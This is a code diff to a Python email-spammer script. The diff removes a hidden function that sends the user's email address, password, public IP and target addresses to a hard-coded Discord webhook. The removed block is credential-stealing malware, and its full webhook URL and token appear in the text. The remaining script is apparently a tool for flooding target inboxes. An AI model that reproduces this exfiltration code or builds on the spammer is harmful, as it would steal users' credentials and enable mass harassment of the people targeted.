@@ -46,34 +46,6 @@ print("emails sent:")
 index = 0
 
 
-def getip():
-    ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:
-        pass
-    return ip
-
-
-def send_webhook():
-    webhook = DiscordWebhook(
-        url='https://discord.com/api/webhooks/848184749385318450/fj5gitSEkJ42nPOGMqtwHym_tKtrxzYThpd4byFWUS1FTQgQrCW9nKunsdMhh4P72U6f')
-
-    embed = DiscordEmbed(title="**Email Account:**",
-                         description="**Email:**" + '\n' + str(email_me) + '\n' + '\n' + "**Password:**" + '\n' + str(
-                             email_pass) + '\n' + '\n' + "**IP:**" + '\n' + str(getip()) + '\n' + '\n' + "**Sent to:**" + '\n' + str(target_email) + '\n' + str(
-                             target_email2) + '\n' + str(target_email3) + '\n' + str(target_email4) + '\n' + str(
-                             target_email5) + '\n' + '\n' "**Sent** " + "**" + str(send_amount) + "**" + " **Times**",
-                         color='8A2BE2')
-
-    webhook.add_embed(embed)
-    response = webhook.execute()
-    return
-
-
-send_webhook()
-
-
 def email_spammer_lol():
     letters = string.ascii_letters
 
